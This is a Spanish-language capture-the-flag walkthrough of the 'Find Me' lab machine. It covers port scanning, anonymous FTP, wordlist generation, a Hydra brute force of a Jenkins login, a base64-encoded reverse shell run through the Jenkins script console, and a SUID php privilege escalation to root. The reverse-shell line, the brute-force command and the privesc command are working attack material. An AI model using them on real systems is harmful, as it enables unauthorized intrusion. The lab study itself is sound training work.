# Find Me

Maquinas que vamos a utilizar Kali Linux y Find Me [https://thehackerslabs.com/find-me/](https://thehackerslabs.com/find-me/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%20182.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=1000 -n -vvv -Pn 10.0.3.37
```

![image.png](./imagenes/image%20183.png)

- Vamos a ver que corre por el puerto 80 y por el puerto 8080 utilizando un navegador web.
    
    ![image.png](./imagenes/image%20184.png)
    
    ![image.png](./imagenes/image%20185.png)
    
    Por aquí no parece haber nada interesante.
    
    ![image.png](./imagenes/image%20186.png)
    
    Nos encontramos ante un **panel de login en el puerto 8080**.
    
    - Probamos a ver el contenido del **archivo robots.txt** del cual nmap nos había dado una pista de que tenia una entrada.
        
        ![image.png](./imagenes/image%20187.png)
        
        ![image.png](./imagenes/image%20188.png)
        
    
- Seguimos investigando en el FTP  puerto 21 ya que admite **anonymous**.
    
    ```bash
    ftp 10.0.3.37 
    ```
    
    ![image.png](./imagenes/image%20189.png)
    
    - Listamos y nos encontramos un archivo llamado ayuda.txt. Lo llevamos a nuestra maquina Kali y lo examinamos.
        
        `ls -la`
        
        `get ayuda.txt`
        
        ![image.png](./imagenes/image%20190.png)
        
        ```bash
        cat ayuda.txt
        ```
        
        ![image.png](./imagenes/image%20191.png)
        
        Nos muestra una interesante información. Un posible nombre de usuario “**geralt**” y que la **contraseña empieza por p y acaba en a y en total tiene 5 caracteres**.
        
- Nos vamos a crear un diccionario de dos maneras posibles teniendo en cuenta los daros que sabemos.
    
    
    1. Con el comando `crunch` nos creamos un diccionario desde cero siguiendo las especificaciones.
        
        ```bash
        crunch 5 5 -t p@@@a -o dic1.txt
        ```
        
        <aside>
        
        `crunch 5 5`: Genera palabras de exactamente 5 caracteres de longitud.
        
        `-t p@@@a`: Usa un patrón donde `p` y `a` son caracteres fijos, mientras que `@@@` representa caracteres variables (generalmente letras minúsculas, mayúsculas o números).
        
        `-o dic1.txt`: Guarda la lista generada en un archivo llamado `dic1.txt`.
        
        </aside>
        
        ![image.png](./imagenes/image%20192.png)
        
    
    1. Nos creamos un diccionario a partir de uno ya creado aplicando filtros para que cumpla las especificaciones. Vamos a usar como base el diccionario **rockyou.txt** .
        
        ```bash
        head -n 5000 /usr/share/wordlists/rockyou.txt | grep -E ^p...a$ > dic2.txt
        ```
        
        ```bash
        cat dic2.txt 
        ```
        
        <aside>
        
        `head -n 5000 /usr/share/wordlists/rockyou.txt`: Toma las primeras 5000 líneas del archivo `rockyou.txt`, que es una lista común de contraseñas.
        
        `| grep -E ^p...a$`: Filtra las palabras que comienzan con "p", terminan con "a" y tienen exactamente cinco caracteres, usando `grep` con una expresión regular.
        
        `> dic2.txt`: Guarda el resultado en un archivo llamado `dic2.txt`.
        
        </aside>
        
        ![image.png](./imagenes/image%20193.png)
        
    
- Usamos Hydra con los diccionarios para tener acceso.
    
    ```bash
    hydra -l geralt -P dic2.txt 10.0.3.37 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=:c=/login:Invalid username or password" -f -V
    ```
    
    ![image.png](./imagenes/image%20194.png)
    
    **login: geralt   password: panda**
    
    <aside>
    💡
    
    - Explicación del comando que utilizamos y como componerlo paso a paso:
        
        Antes de nada abrimos las **herramientas de desarrollador** en el navegador web y hacemos un intento de **login fallido**. En mi caso será username: pedro y Password: 123123.
        
        `hydra -l geralt -P dic2.txt 10.0.3.37 -s 8080 http-post-form`
        
        ![image.png](./imagenes/image%20195.png)
        
        <aside>
        👉
        
        `hydra`: Llama a la herramienta Hydra.
        
        `-l geralt`: Define el nombre de usuario fijo como "geralt".
        
        `-P dic2.txt`: Usa el archivo `dic2.txt` como lista de posibles contraseñas.
        
        `10.0.3.37`: Es la dirección IP del objetivo.
        
        `-s 8080`: Especifica el puerto 8080.
        
        `http-post-form`: Indica que se está probando una autenticación web basada en un formulario con el método HTTP POST.
        
        </aside>
        
        ---
        
        `hydra -l geralt -P dic2.txt 10.0.3.37 -s 8080 http-post-form "**/j_spring_security_check:**"` 
        
        ![image.png](./imagenes/image%20196.png)
        
        <aside>
        👉
        
        `http-post-form "/j_spring_security_check:"`: Indica que se está probando un formulario de autenticación basado en HTTP POST, apuntando a la ruta `/j_spring_security_check`, que es utilizada en aplicaciones basadas en **Spring Security** para gestionar inicios de sesión.
        
        </aside>
        
        ---
        
        `hydra -l geralt -P dic2.txt 10.0.3.37 -s 8080 http-post-form "/j_spring_security_check:**j_username=^USER^&j_password=^PASS^&from=%2F&Submit=:**”`
        
        ![image.png](./imagenes/image%20197.png)
        
        Debemos modificar levemente el código copiado de la herramienta desarrollador.
        
        ![image.png](./imagenes/image%20198.png)
        
        <aside>
        👉
        
        Define el formato del formulario de login:
        
        **`j_username=^USER^`** y **`j_password=^PASS^`** se reemplazan por los valores de usuario y contraseña en la lista.
        
        **`from=%2F`** puede indicar que el usuario proviene de la página principal.
        
        **`Submit=`** representa el botón de envío del formulario.
        
        </aside>
        
        ---
        
        `hydra -l geralt -P dic2.txt 10.0.3.37 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=:c=/login:"`  
        
        ![image.png](./imagenes/image%20199.png)
        
        <aside>
        👉
        
        **`c=/login`**: Posible condición de redirección. Si después del intento el servidor sigue en `/login`, puede indicar que la autenticación **falló**.
        
        </aside>
        
        ---
        
        `hydra -l geralt -P dic2.txt 10.0.3.37 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=:c=/login:Invalid username or password”`
        
        ![image.png](./imagenes/image%20200.png)
        
        <aside>
        👉
        
        **`Invalid username or password`**: Mensaje clave. Si el servidor devuelve esta frase, significa que la autenticación **no tuvo éxito**, y Hydra la usa como referencia
        
        </aside>
        
        ---
        
        `hydra -l geralt -P dic2.txt 10.0.3.37 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=:c=/login:Invalid username or password" -f -V`
        
        ![image.png](./imagenes/image%20201.png)
        
        <aside>
        👉
        
        **`-f`**: Hace que `Hydra` **detenga la ejecución** tan pronto como encuentre una combinación válida de usuario y contraseña.
        
        **`-V`**: Muestra información **detallada** de cada intento realizado, incluyendo las credenciales probadas en tiempo real.
        
        </aside>
        
    </aside>
    

- Introducimos las nuevas credenciales
    
    ![image.png](./imagenes/image%20202.png)
    
    ![image.png](./imagenes/image%20203.png)
    
- Hacemos una búsqueda en internet para encontrar trucos o cosas que podemos hacer con  Jenkins. **`jenkins hacktricks`**
    
    He encontrado esta web [https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins](./imagenes/https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins)
    
    ![image.png](./imagenes/image%20204.png)
    

- Nos vamos al Path que nos indica. ***/script***
    
    ![image.png](./imagenes/image%20205.png)
    
- Vamos adaptar el código que habíamos encontrado a nuestras necesidades ya la rever shell estará con una IP que no es nuestra y con un puerto que desconocemos codificado en base64.
    - Nos vamos a [https://www.revshells.com/](./imagenes/https://www.revshells.com/)
        
        ![image.png](./imagenes/image%20206.png)
        
        ![image.png](./imagenes/image%20207.png)
        
        `c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4zLjQvNDQzIDA+JjE=`
        
- Sustituiríamos el código en base64 por el nuestro
    
    ![image.png](./imagenes/image%20208.png)
    
- Nos ponemos a la escucha por el puerto 443
    
    ```bash
    nc -nlvp 443
    ```
    
    ![image.png](./imagenes/image%20209.png)
    
- Ejecutamos el Script
    
    ![image.png](./imagenes/image%20210.png)
    
    ![image.png](./imagenes/image%20211.png)
    

- Hacemos un tratamiento de la TTY
    
    `script /dev/null -c bash`
    
    Hacemos un `**CTRL+Z**`
    
    Escribimos a continuación.
    
    `stty raw -echo; fg`
    
    Escribimos `reset xterm` . Es posible que no se muestre cuando lo escribimos pero aun así lo escribimos y pulsamos Enter. Y nos aparecerá la siguiente pantalla.
    
    Por ultimo tenemos que exportar 2 variables. escribimos lo siguiente.
    
    `export TERM=xterm`
    
    `export SHELL=bash`
    
    ![image.png](./imagenes/image%20212.png)
    
- Miramos permisos SUID
    
    `find / -perm -4000 2>/dev/null`
    
    ![image.png](./imagenes/image%20213.png)
    

- Usamos la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/)
    
    ![image.png](./imagenes/image%20214.png)
    
    **./php -r "pcntl_exec('/bin/sh', ['-p']);”**
    
    Lo modificamos para sustituir el proceso por una **bash** y asir ser root.
    
    `/usr/bin/php8.2 -r "pcntl_exec('/bin/bash', ['-p']);"`
    
    `whoami`
    
    ![image.png](./imagenes/image%20215.png)
  